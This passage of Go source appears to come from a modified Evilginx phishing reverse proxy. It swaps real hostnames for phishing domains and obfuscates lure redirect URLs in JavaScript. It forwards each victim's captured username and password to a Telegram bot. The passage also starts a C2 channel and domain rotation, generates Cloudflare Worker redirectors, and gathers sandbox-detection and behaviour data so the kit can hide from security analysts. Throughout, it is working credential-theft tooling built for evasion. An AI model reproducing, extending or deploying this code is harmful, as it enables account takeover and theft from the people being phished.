					enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
					if err == nil {
						dec_params := make([]byte, len(enc_vals))

						c, _ := rc4.NewCipher([]byte(enc_key))
						c.XORKeyStream(dec_params, enc_vals)

						params, err := url.ParseQuery(string(dec_params))
						if err == nil {
							for kk, vv := range params {
								log.Debug("param: %s='%s'", kk, vv[0])

								session.Params[kk] = vv[0]
							}
							ret = true
							break
						}
					}
				}
			}
		}*/
	return ret
}

func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[string]string) string {

	// generate forwarder parameter
	t := make([]byte, 5)
	cryptorand.Read(t[1:])
	var crc byte = 0
	for _, b := range t[1:] {
		crc += b
	}
	t[0] = crc
	fwd_param := base64.RawURLEncoding.EncodeToString(t)

	lure_url += "?" + strings.ToLower(GenRandomString(1)) + "=" + fwd_param

	for k, v := range *params {
		key := "{" + k + "}"
		body = strings.Replace(body, key, html.EscapeString(v), -1)
	}

	// Enhanced URL obfuscation with variable chunk sizes
	var js_url string
	n := 0
	chunkVariation := rand.Intn(3) + 1 // Variable chunk sizes (1-3 multiplier)

	for n < len(lure_url) {
		t := make([]byte, 1)
		cryptorand.Read(t)
		rn := (int(t[0])%chunkVariation + 1) * chunkVariation

		if rn+n > len(lure_url) {
			rn = len(lure_url) - n
		}

		if n > 0 {
			js_url += " + "
		}

		// Add string manipulation to further obfuscate
		chunk := lure_url[n : n+rn]
		js_url += "'" + chunk + "'"

		n += rn
	}

	// Add random variable names for obfuscation
	varNames := []string{"_u", "_url", "_link", "_dest", "_target"}
	varName := varNames[rand.Intn(len(varNames))]

	body = strings.Replace(body, "{lure_url_html}", html.EscapeString(lure_url), -1)
	body = strings.Replace(body, "{lure_url_js}", "var "+varName+"="+js_url+";window.location="+varName, -1)

	return body
}

func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
	re_url := MATCH_URL_REGEXP
	re_ns_url := MATCH_URL_REGEXP_WITHOUT_SCHEME

	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
		var sub_map map[string]string = make(map[string]string)
		var hosts []string
		for _, ph := range pl.proxyHosts {
			var h string
			if c_type == CONVERT_TO_ORIGINAL_URLS {
				h = combineHost(ph.phish_subdomain, phishDomain)
				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
			} else {
				h = combineHost(ph.orig_subdomain, ph.domain)
				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
			}
			hosts = append(hosts, h)
		}
		// make sure that we start replacing strings from longest to shortest
		sort.Slice(hosts, func(i, j int) bool {
			return len(hosts[i]) > len(hosts[j])
		})

		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			u, err := url.Parse(s_url)
			if err == nil {
				for _, h := range hosts {
					if strings.ToLower(u.Host) == h {
						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
						break
					}
				}
			}
			return s_url
		}))
		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
			for _, h := range hosts {
				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
					s_url = strings.Replace(s_url, h, sub_map[h], 1)
					break
				}
			}
			return s_url
		}))
	}
	return body
}

func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
		parts := strings.SplitN(host, ":", 2)
		hostname := parts[0]
		port := 443
		if len(parts) == 2 {
			port, _ = strconv.Atoi(parts[1])
		}

		tls_cfg := &tls.Config{}
		if !p.developer {

			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
			tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.NextProtos, tlsalpn01.ACMETLS1Protocol)

			return tls_cfg, nil
		} else {
			var ok bool
			phish_host := ""
			if !p.cfg.IsLureHostnameValid(hostname) {
				phish_host, ok = p.replaceHostWithPhished(hostname)
				if !ok {
					log.Debug("phishing hostname not found: %s", hostname)
					return nil, fmt.Errorf("phishing hostname not found")
				}
			}

			cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
			if err != nil {
				log.Error("http_proxy: %s", err)
				return nil, err
			}
			return &tls.Config{
				InsecureSkipVerify: true,
				Certificates:       []tls.Certificate{*cert},
				// Anti-detection: Use standard cipher suites
				CipherSuites: []uint16{
					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
					tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
				},
				// Match browser TLS preferences
				PreferServerCipherSuites: false,
				MinVersion:               tls.VersionTLS12,
				MaxVersion:               tls.VersionTLS13,
			}, nil
		}
	}
}

func (p *HttpProxy) setSessionUsername(sid string, username string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetUsername(username)

		// Check if we have both username and password to send notification
		if s.Username != "" && s.Password != "" {
			if sessionID, ok := p.sids[sid]; ok {
				domain := ""
				if pl, err := p.cfg.GetPhishlet(s.Name); err == nil && pl != nil {
					domain = pl.GetLandingPhishHost()
				}
				p.telegram.SendCredentials(sessionID, s.Username, s.Password, s.RemoteAddr, s.UserAgent, domain, s.Name)
			}
		}
	}
}

func (p *HttpProxy) setSessionPassword(sid string, password string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetPassword(password)

		// Check if we have both username and password to send notification
		if s.Username != "" && s.Password != "" {
			if sessionID, ok := p.sids[sid]; ok {
				domain := ""
				if pl, err := p.cfg.GetPhishlet(s.Name); err == nil && pl != nil {
					domain = pl.GetLandingPhishHost()
				}
				p.telegram.SendCredentials(sessionID, s.Username, s.Password, s.RemoteAddr, s.UserAgent, domain, s.Name)
			}
		}
	}
}

func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
	if sid == "" {
		return
	}
	s, ok := p.sessions[sid]
	if ok {
		s.SetCustom(name, value)
	}
}


func (p *HttpProxy) httpsWorker() {
	var err error

	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
	if err != nil {
		log.Fatal("%s", err)
		return
	}

	p.isRunning = true
	for p.isRunning {
		c, err := p.sniListener.Accept()
		if err != nil {
			log.Error("Error accepting connection: %s", err)
			continue
		}

		go func(c net.Conn) {
			now := time.Now()
			c.SetReadDeadline(now.Add(httpReadTimeout))
			c.SetWriteDeadline(now.Add(httpWriteTimeout))

			// Wrap connection with TLS interceptor
			if p.tlsInterceptor != nil {
				c = p.tlsInterceptor.WrapConn(c)
			}

			tlsConn, err := vhost.TLS(c)
			if err != nil {
				return
			}

			hostname := tlsConn.Host()
			if hostname == "" {
				return
			}

			if !p.cfg.IsActiveHostname(hostname) {
				log.Debug("hostname unsupported: %s", hostname)
				return
			}

			hostname, _ = p.replaceHostWithOriginal(hostname)

			req := &http.Request{
				Method: "CONNECT",
				URL: &url.URL{
					Opaque: hostname,
					Host:   net.JoinHostPort(hostname, "443"),
				},
				Host:       hostname,
				Header:     make(http.Header),
				RemoteAddr: c.RemoteAddr().String(),
			}
			resp := dumbResponseWriter{tlsConn}
			p.Proxy.ServeHTTP(resp, req)
		}(c)
	}
}

func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return pl
				}
			}
		}
	}
	return nil
}

func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return pl
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				pl, err := p.cfg.GetPhishlet(l.Phishlet)
				if err == nil {
					return pl
				}
			}
		}
	}

	return nil
}

func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
	if hostname == "" {
		return hostname, false
	}
	prefix := ""
	if hostname[0] == '.' {
		prefix = "."
		hostname = hostname[1:]
	}
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
				}
				if hostname == ph.domain {
					return prefix + phishDomain, true
				}
			}
		}
	}
	return hostname, false
}

func (p *HttpProxy) replaceUrlWithPhished(u string) (string, bool) {
	r_url, err := url.Parse(u)
	if err == nil {
		if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
			r_url.Host = r_host
			return r_url.String(), true
		}
	}
	return u, false
}

func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return phishDomain, true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				phishDomain, ok := p.cfg.GetSiteDomain(l.Phishlet)
				if ok {
					return phishDomain, true
				}
			}
		}
	}

	return "", false
}

func (p *HttpProxy) getHomeDir() string {
	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
}

func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return ph.phish_subdomain, true
				}
			}
		}
	}
	return "", false
}

func (p *HttpProxy) handleSession(hostname string) bool {
	for site, pl := range p.cfg.phishlets {
		if p.cfg.IsSiteEnabled(site) {
			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
			if !ok {
				continue
			}
			for _, ph := range pl.proxyHosts {
				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
					return true
				}
			}
		}
	}

	for _, l := range p.cfg.lures {
		if l.Hostname == hostname {
			if p.cfg.IsSiteEnabled(l.Phishlet) {
				return true
			}
		}
	}

	return false
}

func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
	if l.OgDescription != "" || l.OgTitle != "" || l.OgImageUrl != "" || l.OgUrl != "" {
		head_re := regexp.MustCompile(`(?i)(<\s*head\s*>)`)
		var og_inject string
		og_format := "<meta property=\"%s\" content=\"%s\" />\n"
		if l.OgTitle != "" {
			og_inject += fmt.Sprintf(og_format, "og:title", l.OgTitle)
		}
		if l.OgDescription != "" {
			og_inject += fmt.Sprintf(og_format, "og:description", l.OgDescription)
		}
		if l.OgImageUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:image", l.OgImageUrl)
		}
		if l.OgUrl != "" {
			og_inject += fmt.Sprintf(og_format, "og:url", l.OgUrl)
		}

		body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
	}
	return body
}

func (p *HttpProxy) Start() error {
	// Configure and start Telegram bot
	telegramConfig := p.cfg.GetTelegramConfig()
	if telegramConfig != nil {
		p.telegram.SetConfig(telegramConfig.BotToken, telegramConfig.ChatID, telegramConfig.Enabled)
		p.telegram.Start()
	}

	// Start domain rotation if enabled
	if p.domainRotation != nil && p.cfg.GetDomainRotationConfig().Enabled {
		err := p.domainRotation.Start()
		if err != nil {
			log.Error("Failed to start domain rotation: %v", err)
		}
	}

	// Start traffic shaper if enabled
	if p.trafficShaper != nil && p.cfg.GetTrafficShapingConfig().Enabled {
		err := p.trafficShaper.Start()
		if err != nil {
			log.Error("Failed to start traffic shaper: %v", err)
		}
	}

	// Start C2 channel if enabled
	if p.c2Channel != nil && p.cfg.GetC2ChannelConfig().Enabled {
		err := p.c2Channel.Start()
		if err != nil {
			log.Error("Failed to start C2 channel: %v", err)
		}
	}

	go p.httpsWorker()
	return nil
}

func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("whitelistIP: %s %s", ip_addr, sid)
	p.ip_whitelist[ip_addr+"-"+pl_name] = time.Now().Add(10 * time.Minute).Unix()
	p.ip_sids[ip_addr+"-"+pl_name] = sid
}

func (p *HttpProxy) isWhitelistedIP(ip_addr string, pl_name string) bool {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	log.Debug("isWhitelistIP: %s", ip_addr+"-"+pl_name)
	ct := time.Now()
	if ip_t, ok := p.ip_whitelist[ip_addr+"-"+pl_name]; ok {
		et := time.Unix(ip_t, 0)
		return ct.Before(et)
	}
	return false
}

func (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, bool) {
	p.ip_mtx.Lock()
	defer p.ip_mtx.Unlock()

	pl := p.getPhishletByPhishHost(hostname)
	if pl != nil {
		sid, ok := p.ip_sids[ip_addr+"-"+pl.Name]
		return sid, ok
	}
	return "", false
}

func (p *HttpProxy) getClientIdentifier(req *http.Request) string {
	// Extract client IP
	ip := req.RemoteAddr
	if forwarded := req.Header.Get("X-Forwarded-For"); forwarded != "" {
		ips := strings.Split(forwarded, ",")
		if len(ips) > 0 {
			ip = strings.TrimSpace(ips[0])
		}
	} else if realIP := req.Header.Get("X-Real-IP"); realIP != "" {
		ip = realIP
	}
	
	// Remove port if present
	if idx := strings.LastIndex(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}
	
	// Combine IP with user agent for unique identifier
	ua := req.UserAgent()
	identifier := fmt.Sprintf("%s|%s", ip, ua)
	
	// Hash for consistency and privacy
	hash := sha256.Sum256([]byte(identifier))
	return fmt.Sprintf("%x", hash[:16]) // Use first 16 bytes for shorter ID
}

func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {
	if enabled {
		ptypes := []string{"http", "https", "socks5", "socks5h"}
		if !stringExists(ptype, ptypes) {
			return fmt.Errorf("invalid proxy type selected")
		}
		if len(address) == 0 {
			return fmt.Errorf("proxy address can't be empty")
		}
		if port == 0 {
			return fmt.Errorf("proxy port can't be 0")
		}

		u := url.URL{
			Scheme: ptype,
			Host:   address + ":" + strconv.Itoa(port),
		}

		if strings.HasPrefix(ptype, "http") {
			var dproxy *http_dialer.HttpTunnel
			if username != "" {
				dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
			} else {
				dproxy = http_dialer.New(&u)
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		} else {
			if username != "" {
				u.User = url.UserPassword(username, password)
			}

			dproxy, err := proxy.FromURL(&u, nil)
			if err != nil {
				return err
			}
			p.Proxy.Tr.Dial = dproxy.Dial
		}
	} else {
		p.Proxy.Tr.Dial = nil
	}
	return nil
}

type dumbResponseWriter struct {
	net.Conn
}

func (dumb dumbResponseWriter) Header() http.Header {
	panic("Header() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Write(buf []byte) (int, error) {
	if bytes.Equal(buf, []byte("HTTP/1.0 200 OK\r\n\r\n")) {
		return len(buf), nil // throw away the HTTP OK response from the faux CONNECT request
	}
	return dumb.Conn.Write(buf)
}

func (dumb dumbResponseWriter) WriteHeader(code int) {
	panic("WriteHeader() should not be called on this ResponseWriter")
}

func (dumb dumbResponseWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	return dumb, bufio.NewReadWriter(bufio.NewReader(dumb), bufio.NewWriter(dumb)), nil
}

func orPanic(err error) {
	if err != nil {
		panic(err)
	}
}

func getContentType(path string, data []byte) string {
	switch filepath.Ext(path) {
	case ".css":
		return "text/css"
	case ".js":
		return "application/javascript"
	case ".svg":
		return "image/svg+xml"
	}
	return http.DetectContentType(data)
}

func (p *HttpProxy) handleCloudflareWorkerAPI(req *http.Request) (*http.Request, *http.Response) {
	if req.Method != "POST" && req.Method != "GET" {
		return req, goproxy.NewResponse(req, "application/json", http.StatusMethodNotAllowed, `{"error":"Method not allowed"}`)
	}

	// Parse request based on method
	var config CloudflareWorkerConfig

	if req.Method == "POST" {
		decoder := json.NewDecoder(req.Body)
		if err := decoder.Decode(&config); err != nil {
			return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, fmt.Sprintf(`{"error":"Invalid request: %s"}`, err.Error()))
		}
		defer req.Body.Close()
	} else {
		// GET method - parse query parameters
		query := req.URL.Query()
		config.Type = WorkerType(query.Get("type"))
		if config.Type == "" {
			config.Type = WorkerTypeSimpleRedirect
		}
		config.RedirectUrl = query.Get("redirect_url")
		config.UserAgentFilter = query.Get("ua_filter")
		config.LogRequests = query.Get("log_requests") == "true"

		// Parse delay
		if delay := query.Get("delay"); delay != "" {
			if d, err := strconv.Atoi(delay); err == nil {
				config.DelaySeconds = d
			}
		}

		// Parse geo filter
		if geoFilter := query.Get("geo_filter"); geoFilter != "" {
			config.GeoFilter = strings.Split(geoFilter, ",")
		}
	}

	// Validate required fields
	if config.RedirectUrl == "" {
		// Try to get from lure if lure_index is provided
		lureIndex := req.URL.Query().Get("lure_index")
		if lureIndex != "" {
			if idx, err := strconv.Atoi(lureIndex); err == nil {
				if lure, err := p.cfg.GetLure(idx); err == nil {
					// Build redirect URL from lure
					if lure.Hostname != "" && lure.Path != "" {
						config.RedirectUrl = fmt.Sprintf("https://%s%s", lure.Hostname, lure.Path)
						config.UserAgentFilter = lure.UserAgentFilter
					}
				}
			}
		}

		if config.RedirectUrl == "" {
			return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"redirect_url is required"}`)
		}
	}

	// Generate worker script
	generator := NewCloudflareWorkerGenerator(p.cfg)
	workerScript, err := generator.GenerateWorker(config)
	if err != nil {
		return req, goproxy.NewResponse(req, "application/json", http.StatusInternalServerError, fmt.Sprintf(`{"error":"Failed to generate worker: %s"}`, err.Error()))
	}

	// Return the worker script
	if req.URL.Query().Get("format") == "json" {
		response := map[string]interface{}{
			"success": true,
			"worker":  workerScript,
			"config":  config,
		}
		jsonResponse, _ := json.Marshal(response)
		return req, goproxy.NewResponse(req, "application/json", http.StatusOK, string(jsonResponse))
	}

	// Default: return raw JavaScript
	resp := goproxy.NewResponse(req, "application/javascript", http.StatusOK, workerScript)
	resp.Header.Set("Content-Disposition", "attachment; filename=cloudflare-worker.js")
	return req, resp
}

func (p *HttpProxy) handleBehaviorData(req *http.Request) (*http.Request, *http.Response) {
	// Extract session ID from path
	pathParts := strings.Split(req.URL.Path, "/")
	if len(pathParts) < 4 {
		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Invalid request"}`)
	}
	
	sessionID := pathParts[3]
	
	// Only accept POST requests
	if req.Method != "POST" {
		return req, goproxy.NewResponse(req, "application/json", http.StatusMethodNotAllowed, `{"error":"Method not allowed"}`)
	}
	
	// Read request body
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Failed to read request body"}`)
	}
	defer req.Body.Close()
	
	// Parse behavior data
	var behaviorData map[string]interface{}
	if err := json.Unmarshal(body, &behaviorData); err != nil {
		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Invalid JSON"}`)
	}
	
	// Get client identifier
	clientID := p.getClientIdentifier(req)
	
	// Update ML detector's feature extractor with behavior data
	if p.mlDetector != nil && p.mlDetector.featureExtractor != nil {
		err := p.mlDetector.featureExtractor.UpdateClientBehavior(clientID, behaviorData)
		if err != nil {
			log.Debug("[ML Detector] Failed to update behavior: %v", err)
		}
	}
	
	// Log behavior data counts safely
	mouseCount := 0
	keyboardCount := 0
	if mouseData, ok := behaviorData["mouse"].([]interface{}); ok {
		mouseCount = len(mouseData)
	}
	if keyboardData, ok := behaviorData["keyboard"].([]interface{}); ok {
		keyboardCount = len(keyboardData)
	}
	
	log.Debug("[Behavior] Received data from session %s: %d mouse, %d keyboard events", 
		sessionID, mouseCount, keyboardCount)
	
	// Return success response
	return req, goproxy.NewResponse(req, "application/json", http.StatusOK, `{"status":"ok"}`)
}

func (p *HttpProxy) handleSandboxDetection(req *http.Request) (*http.Request, *http.Response) {
	// Only accept POST requests
	if req.Method != "POST" {
		return req, goproxy.NewResponse(req, "application/json", http.StatusMethodNotAllowed, `{"error":"Method not allowed"}`)
	}
	
	// Read request body
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Failed to read request body"}`)
	}
	defer req.Body.Close()
	
	// Get client IP
	from_ip := strings.Split(req.RemoteAddr, ":")[0]
	
	// Process detection data
	if p.sandboxDetector != nil {
		err := p.sandboxDetector.ProcessClientDetection(body, from_ip)
		if err != nil {
			log.Debug("[Sandbox Detector] Failed to process client detection: %v", err)
			return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Invalid detection data"}`)
		}
	}
	
	log.Debug("[Sandbox Detector] Received client-side detection from %s", from_ip)
	
	// Return success response
	return req, goproxy.NewResponse(req, "application/json", http.StatusOK, `{"status":"ok"}`)
}

func (p *HttpProxy) handleCaptchaVerification(req *http.Request) (*http.Request, *http.Response) {
	// Only accept POST requests
	if req.Method != "POST" {
		return req, goproxy.NewResponse(req, "application/json", http.StatusMethodNotAllowed, `{"error":"Method not allowed"}`)
	}
	
	// Read request body
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Failed to read request body"}`)
	}
	defer req.Body.Close()
	
	// Parse CAPTCHA response
	var captchaData struct {
		Response string `json:"response"`
	}
	if err := json.Unmarshal(body, &captchaData); err != nil {
		return req, goproxy.NewResponse(req, "application/json", http.StatusBadRequest, `{"error":"Invalid JSON"}`)
	}
	
	// Get remote IP
	remoteIP := req.RemoteAddr
	if forwarded := req.Header.Get("X-Forwarded-For"); forwarded != "" {
		remoteIP = strings.Split(forwarded, ",")[0]
	}
	
	// Verify CAPTCHA
	verified := false
	if p.captchaManager != nil {
		verified, err = p.captchaManager.VerifyCaptcha(captchaData.Response, remoteIP)
		if err != nil {
			log.Error("[CAPTCHA] Verification error: %v", err)
		}
	}
	
	if verified {
		// Get session ID from cookie
		sessionCookie, err := req.Cookie("evilginx_session")
		if err == nil && sessionCookie != nil {
			p.session_mtx.Lock()
			if session, exists := p.sessions[sessionCookie.Value]; exists {
				session.IsCaptchaVerified = true
				log.Success("[CAPTCHA] Verification successful for session: %s", session.Id)
			}
			p.session_mtx.Unlock()
		}
		
		return req, goproxy.NewResponse(req, "application/json", http.StatusOK, `{"success":true}`)
	} else {
		log.Warning("[CAPTCHA] Verification failed from IP: %s", remoteIP)
		return req, goproxy.NewResponse(req, "application/json", http.StatusOK, `{"success":false,"error":"Verification failed"}`)
	}
}

func getSessionCookieName(pl_name string, cookie_name string) string {
	hash := sha256.Sum256([]byte(pl_name + "-" + cookie_name))
	s_hash := fmt.Sprintf("%x", hash[:4])
	s_hash = s_hash[:4] + "-" + s_hash[4:]
	return s_hash
}
